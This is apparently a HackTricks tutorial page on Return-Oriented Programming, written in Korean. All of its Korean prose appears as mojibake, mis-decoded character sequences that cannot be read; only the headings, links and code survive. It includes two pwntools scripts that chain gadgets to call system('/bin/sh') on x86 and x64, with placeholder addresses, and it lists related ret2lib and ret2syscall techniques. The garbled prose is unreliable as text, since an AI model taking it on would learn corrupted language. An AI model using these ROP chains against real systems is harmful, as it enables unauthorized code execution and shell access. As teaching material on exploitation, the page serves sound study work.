# ROP - Return Oriented Programing

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ìœ¼ë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## **ê¸°ë³¸ ì •ë³´**

**Return-Oriented Programming (ROP)**ì€ **No-Execute (NX)** ë˜ëŠ” **Data Execution Prevention (DEP)**ê³¼ ê°™ì€ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ìš°íšŒí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê³ ê¸‰ ê³µê²© ê¸°ë²•ì…ë‹ˆë‹¤. ê³µê²©ìëŠ” ì…¸ì½”ë“œë¥¼ ì‚½ì…í•˜ê³  ì‹¤í–‰í•˜ëŠ” ëŒ€ì‹ , **ë°”ì´ë„ˆë¦¬ë‚˜ ë¡œë“œëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ì½”ë“œ ì¡°ê°ì¸ "ê°€ì ¯"**ì„ í™œìš©í•©ë‹ˆë‹¤. ê° ê°€ì ¯ì€ ì¼ë°˜ì ìœ¼ë¡œ `ret` ëª…ë ¹ìœ¼ë¡œ ëë‚˜ë©° ë°ì´í„°ë¥¼ ë ˆì§€ìŠ¤í„° ê°„ì— ì´ë™í•˜ê±°ë‚˜ ì‚°ìˆ  ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” ë“±ì˜ ì‘ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê°€ì ¯ì„ ì—°ê²°í•˜ì—¬ ê³µê²©ìëŠ” ì„ì˜ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•˜ì—¬ NX/DEP ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ROP ì‘ë™ ë°©ì‹

1. **ì œì–´ íë¦„ íƒˆì·¨**: ë¨¼ì €, ê³µê²©ìëŠ” í”„ë¡œê·¸ë¨ì˜ ì œì–´ íë¦„ì„ íƒˆì·¨í•´ì•¼ í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì´ìš©í•˜ì—¬ ìŠ¤íƒì— ì €ì¥ëœ ë°˜í™˜ ì£¼ì†Œë¥¼ ë®ì–´ì”ë‹ˆë‹¤.
2. **ê°€ì ¯ ì²´ì´ë‹**: ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” ì›í•˜ëŠ” ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì£¼ì˜ ê¹Šê²Œ ê°€ì ¯ì„ ì„ íƒí•˜ê³  ì—°ê²°í•©ë‹ˆë‹¤. ì´ëŠ” í•¨ìˆ˜ í˜¸ì¶œì˜ ì¸ìˆ˜ë¥¼ ì„¤ì •í•˜ê³  í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©°(`system("/bin/sh")`ê³¼ ê°™ì€), í•„ìš”í•œ ì •ë¦¬ ë˜ëŠ” ì¶”ê°€ ì‘ì—…ì„ ì²˜ë¦¬í•˜ëŠ” ê²ƒì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **í˜ì´ë¡œë“œ ì‹¤í–‰**: ì·¨ì•½í•œ í•¨ìˆ˜ê°€ ë°˜í™˜ë  ë•Œ, í•©ë²•ì ì¸ ìœ„ì¹˜ë¡œ ë°˜í™˜í•˜ëŠ” ëŒ€ì‹  ê°€ì ¯ ì²´ì¸ì„ ì‹¤í–‰í•˜ê¸° ì‹œì‘í•©ë‹ˆë‹¤.

### ë„êµ¬

ì¼ë°˜ì ìœ¼ë¡œ [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) ë˜ëŠ” **pwntools**([ROP](https://docs.pwntools.com/en/stable/rop/rop.html))ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ì ¯ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## x86 ì˜ˆì œì—ì„œ ROP ì²´ì¸

### **x86 (32ë¹„íŠ¸) í˜¸ì¶œ ê·œì¹™**

- **cdecl**: í˜¸ì¶œìê°€ ìŠ¤íƒì„ ì •ë¦¬í•©ë‹ˆë‹¤. í•¨ìˆ˜ ì¸ìˆ˜ëŠ” ì—­ìˆœìœ¼ë¡œ ìŠ¤íƒì— í‘¸ì‹œë©ë‹ˆë‹¤(ì˜¤ë¥¸ìª½ì—ì„œ ì™¼ìª½ìœ¼ë¡œ). **ì¸ìˆ˜ëŠ” ì˜¤ë¥¸ìª½ì—ì„œ ì™¼ìª½ìœ¼ë¡œ ìŠ¤íƒì— í‘¸ì‹œë©ë‹ˆë‹¤.**
- **stdcall**: cdeclê³¼ ìœ ì‚¬í•˜ì§€ë§Œ í˜¸ì¶œëœ í•¨ìˆ˜ê°€ ìŠ¤íƒì„ ì •ë¦¬í•©ë‹ˆë‹¤.

### **ê°€ì ¯ ì°¾ê¸°**

ë¨¼ì €, ë°”ì´ë„ˆë¦¬ë‚˜ ë¡œë“œëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì—ì„œ í•„ìš”í•œ ê°€ì ¯ì„ ì‹ë³„í–ˆë‹¤ê³  ê°€ì •í•´ ë´…ì‹œë‹¤. ìš°ë¦¬ê°€ ê´€ì‹¬ì„ ê°€ì§€ëŠ” ê°€ì ¯ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

- `pop eax; ret`: ì´ ê°€ì ¯ì€ ìŠ¤íƒì˜ ìµœìƒìœ„ ê°’ì„ `EAX` ë ˆì§€ìŠ¤í„°ë¡œ íŒí•˜ê³  ë°˜í™˜í•˜ì—¬ `EAX`ë¥¼ ì œì–´í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
- `pop ebx; ret`: ìœ„ì™€ ìœ ì‚¬í•˜ì§€ë§Œ `EBX` ë ˆì§€ìŠ¤í„°ë¥¼ ìœ„í•œ ê²ƒìœ¼ë¡œ, `EBX`ë¥¼ ì œì–´í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
- `mov [ebx], eax; ret`: `EAX`ì˜ ê°’ì„ `EBX`ê°€ ê°€ë¦¬í‚¤ëŠ” ë©”ëª¨ë¦¬ ìœ„ì¹˜ë¡œ ì´ë™í•œ ë‹¤ìŒ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ë¥¼ **write-what-where ê°€ì ¯**ì´ë¼ê³  í•©ë‹ˆë‹¤.
- ì¶”ê°€ë¡œ `system()` í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ROP ì²´ì¸**

**pwntools**ë¥¼ ì‚¬ìš©í•˜ì—¬ ROP ì²´ì¸ ì‹¤í–‰ì„ ìœ„í•´ ìŠ¤íƒì„ ì¤€ë¹„í•©ë‹ˆë‹¤. `system('/bin/sh')`ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ëª©í‘œë¡œ í•˜ëŠ” ROP ì²´ì¸ì´ ë‹¤ìŒê³¼ ê°™ì´ ì‹œì‘í•˜ëŠ” ë°©ë²•ì— ì£¼ëª©í•˜ì„¸ìš”:

1. ì •ë ¬ ëª©ì ì„ ìœ„í•œ `ret` ëª…ë ¹(ì„ íƒ ì‚¬í•­)
2. `system` í•¨ìˆ˜ì˜ ì£¼ì†Œ (ASLR ë¹„í™œì„±í™” ë° ì•Œë ¤ì§„ libcë¥¼ ê°€ì •, ìì„¸í•œ ì •ë³´ëŠ” [**Ret2lib**](ret2lib/) ì°¸ì¡°)
3. `system()`ì—ì„œì˜ ë°˜í™˜ ì£¼ì†Œë¥¼ ìœ„í•œ ìë¦¬ í‘œì‹œì
4. `"/bin/sh"` ë¬¸ìì—´ ì£¼ì†Œ (system í•¨ìˆ˜ì˜ ë§¤ê°œë³€ìˆ˜)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64(64ë¹„íŠ¸) í˜¸ì¶œ ê·œì•½

- Unixë¥˜ ì‹œìŠ¤í…œì—ì„œëŠ” **System V AMD64 ABI** í˜¸ì¶œ ê·œì•½ì„ ì‚¬ìš©í•˜ë©°, **ì²« ë²ˆì§¸ë¡œ ì „ë‹¬ë˜ëŠ” ì—¬ì„¯ ê°œì˜ ì •ìˆ˜ ë˜ëŠ” í¬ì¸í„° ì¸ìˆ˜ëŠ” ë ˆì§€ìŠ¤í„° `RDI`, `RSI`, `RDX`, `RCX`, `R8`, ê·¸ë¦¬ê³  `R9`ì— ì „ë‹¬**ë©ë‹ˆë‹¤. ì¶”ê°€ ì¸ìˆ˜ëŠ” ìŠ¤íƒì— ì „ë‹¬ë©ë‹ˆë‹¤. ë°˜í™˜ ê°’ì€ `RAX`ì— ë°°ì¹˜ë©ë‹ˆë‹¤.
- **Windows x64** í˜¸ì¶œ ê·œì•½ì€ ì²« ë„¤ ê°œì˜ ì •ìˆ˜ ë˜ëŠ” í¬ì¸í„° ì¸ìˆ˜ì— ëŒ€í•´ `RCX`, `RDX`, `R8`, ê·¸ë¦¬ê³  `R9`ë¥¼ ì‚¬ìš©í•˜ë©°, ì¶”ê°€ ì¸ìˆ˜ëŠ” ìŠ¤íƒì— ì „ë‹¬ë©ë‹ˆë‹¤. ë°˜í™˜ ê°’ì€ `RAX`ì— ë°°ì¹˜ë©ë‹ˆë‹¤.
- **ë ˆì§€ìŠ¤í„°**: 64ë¹„íŠ¸ ë ˆì§€ìŠ¤í„°ì—ëŠ” `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, ê·¸ë¦¬ê³  `R8`ë¶€í„° `R15`ê¹Œì§€ê°€ í¬í•¨ë©ë‹ˆë‹¤.

### **ê°€ì ¯ ì°¾ê¸°**

ìš°ë¦¬ì˜ ëª©ì ì„ ìœ„í•´, **RDI** ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•˜ê³ (**system()**ì— **"/bin/sh"** ë¬¸ìì—´ì„ ì „ë‹¬í•˜ê¸° ìœ„í•¨) **system()** í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ê°€ì ¯ì— ì§‘ì¤‘í•´ë³´ê² ìŠµë‹ˆë‹¤. ë‹¤ìŒ ê°€ì ¯ë“¤ì„ ì‹ë³„í–ˆë‹¤ê³  ê°€ì •í•´ë´…ì‹œë‹¤:

- **pop rdi; ret**: ìŠ¤íƒì˜ ìµœìƒìœ„ ê°’ì„ **RDI**ë¡œ íŒí•˜ê³  ë°˜í™˜í•©ë‹ˆë‹¤. **system()**ì— ëŒ€í•œ ì¸ìˆ˜ ì„¤ì •ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.
- **ret**: ê°„ë‹¨í•œ ë°˜í™˜ìœ¼ë¡œ, ì¼ë¶€ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ìŠ¤íƒ ì •ë ¬ì— ìœ ìš©í•©ë‹ˆë‹¤.

ê·¸ë¦¬ê³  **system()** í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì•Œê³  ìˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.

### **ROP Chain**

ì•„ë˜ëŠ” **pwntools**ë¥¼ ì‚¬ìš©í•˜ì—¬ **x64**ì—ì„œ **system('/bin/sh')**ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ROP ì²´ì¸ì„ ì„¤ì •í•˜ê³  ì‹¤í–‰í•˜ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### ìŠ¤íƒ ì •ë ¬

**x86-64 ABI**ëŠ” **call ëª…ë ¹ì–´**ê°€ ì‹¤í–‰ë  ë•Œ **ìŠ¤íƒì´ 16ë°”ì´íŠ¸ ì •ë ¬**ë˜ì–´ ìˆìŒì„ ë³´ì¥í•©ë‹ˆë‹¤. **LIBC**ëŠ” ì„±ëŠ¥ì„ ìµœì í™”í•˜ê¸° ìœ„í•´ **SSE ëª…ë ¹ì–´**(ì˜ˆ: **movaps**)ë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, ì´ëŠ” ì •ë ¬ì´ í•„ìš”í•©ë‹ˆë‹¤. ìŠ¤íƒì´ ì œëŒ€ë¡œ ì •ë ¬ë˜ì§€ ì•Šìœ¼ë©´ (**RSP**ê°€ 16ì˜ ë°°ìˆ˜ê°€ ì•„ë‹Œ ê²½ìš°) **system**ê³¼ ê°™ì€ í•¨ìˆ˜ í˜¸ì¶œì´ **ROP chain**ì—ì„œ ì‹¤íŒ¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ ROP chainì—ì„œ **system**ì„ í˜¸ì¶œí•˜ê¸° ì „ì— **ret gadget**ì„ ì¶”ê°€í•˜ë©´ ë©ë‹ˆë‹¤.

## x86 ëŒ€ x64 ì£¼ìš” ì°¨ì´ì 

{% hint style="success" %}
**x64ëŠ” ì²˜ìŒ ëª‡ ê°œì˜ ì¸ìˆ˜ì— ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©**í•˜ê¸° ë•Œë¬¸ì— ê°„ë‹¨í•œ í•¨ìˆ˜ í˜¸ì¶œì—ëŠ” x86ë³´ë‹¤ ì ì€ ìˆ˜ì˜ ê°€ì ¯ì´ í•„ìš”í•˜ì§€ë§Œ, ì˜¬ë°”ë¥¸ ê°€ì ¯ì„ ì°¾ê³  ì—°ê²°í•˜ëŠ” ê²ƒì€ ë ˆì§€ìŠ¤í„° ìˆ˜ì˜ ì¦ê°€ì™€ ì£¼ì†Œ ê³µê°„ì˜ í™•ëŒ€ë¡œ ì¸í•´ ë” ë³µì¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **x64** ì•„í‚¤í…ì²˜ì˜ ì¦ê°€í•œ ë ˆì§€ìŠ¤í„° ìˆ˜ì™€ ì£¼ì†Œ ê³µê°„ì€ ì£¼ë¡œ Return-Oriented Programming (ROP)ì˜ ë§¥ë½ì—ì„œ exploit ê°œë°œì— ëŒ€í•œ ê¸°íšŒì™€ ë„ì „ì„ ì œê³µí•©ë‹ˆë‹¤.
{% endhint %}

## ARM64 ì˜ˆì œì˜ ROP chain

### **ARM64 ê¸°ë³¸ ì‚¬í•­ ë° í˜¸ì¶œ ê·œì¹™**

ì´ ì •ë³´ë¥¼ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## ROPì— ëŒ€í•œ ë³´í˜¸

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **ë°** [**PIE**](../common-binary-protections-and-bypasses/pie/): ì´ëŸ¬í•œ ë³´í˜¸ ê¸°ëŠ¥ì€ ê°€ì ¯ì˜ ì£¼ì†Œê°€ ì‹¤í–‰ ì‚¬ì´ì— ë³€ê²½ë˜ë¯€ë¡œ ROP ì‚¬ìš©ì´ ì–´ë ¤ì›Œì§‘ë‹ˆë‹¤.
* [**ìŠ¤íƒ ì¹´ë‚˜ë¦¬**](../common-binary-protections-and-bypasses/stack-canaries/): BOFì˜ ê²½ìš°, ROP chainì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ì €ì¥ëœ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¥¼ ìš°íšŒí•˜ì—¬ ë°˜í™˜ í¬ì¸í„°ë¥¼ ë®ì–´ì“°ëŠ” ê²ƒì´ í•„ìš”í•©ë‹ˆë‹¤.
* **ê°€ì ¯ ë¶€ì¡±**: ì¶©ë¶„í•œ ê°€ì ¯ì´ ì—†ìœ¼ë©´ ROP chainì„ ìƒì„±í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

## ROP ê¸°ë°˜ ê¸°ìˆ 

ROPëŠ” ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ê¸°ìˆ ì¼ ë¿ì„ì„ ì•Œì•„ë‘ì„¸ìš”. ROPë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•œ Ret2XXX ê¸°ìˆ ì´ ê°œë°œë˜ì—ˆìŠµë‹ˆë‹¤:

* **Ret2lib**: ë¡œë“œëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì„ì˜ì˜ ë§¤ê°œë³€ìˆ˜(ì¼ë°˜ì ìœ¼ë¡œ `system('/bin/sh')`ì™€ ê°™ì€ ê²ƒ)ë¡œ ì„ì˜ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ROPë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ì‹œìŠ¤í…œ í˜¸ì¶œ(e.g. `execve`)ì„ ì¤€ë¹„í•˜ê³  ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ROPë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret ë° EBP Chaining**: ì²« ë²ˆì§¸ëŠ” EIP ëŒ€ì‹  EBPë¥¼ ì•…ìš©í•˜ì—¬ íë¦„ì„ ì œì–´í•˜ê³ , ë‘ ë²ˆì§¸ëŠ” Ret2libê³¼ ìœ ì‚¬í•˜ì§€ë§Œ ì´ ê²½ìš° íë¦„ì€ ì£¼ë¡œ EBP ì£¼ì†Œë¡œ ì œì–´ë©ë‹ˆë‹¤(ë¬¼ë¡  EIPë¥¼ ì œì–´í•´ì•¼ í•©ë‹ˆë‹¤).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## ê¸°íƒ€ ì˜ˆì œ ë° ì°¸ê³  ìë£Œ

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64ë¹„íŠ¸, Pie ë° nx í™œì„±í™”, ì¹´ë‚˜ë¦¬ ì—†ìŒ, `vsyscall` ì£¼ì†Œë¡œ RIPë¥¼ ë®ì–´ì“°ê³  ìŠ¤íƒì—ì„œ ë‹¤ìŒ ì£¼ì†Œë¡œ ë°˜í™˜í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ë…¸ì¶œí•˜ëŠ” í•¨ìˆ˜ì˜ ì¼ë¶€ë¥¼ ì–»ê¸° ìœ„í•´ ì£¼ì†Œì˜ ì¼ë¶€ë¥¼ ë®ì–´ì“°ëŠ” ê²ƒ
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, ASLR ì—†ìŒ, ROP ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì„ ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ê³  ìŠ¤íƒ ë‚´ì˜ ì…¸ì½”ë“œë¡œ ì´ë™
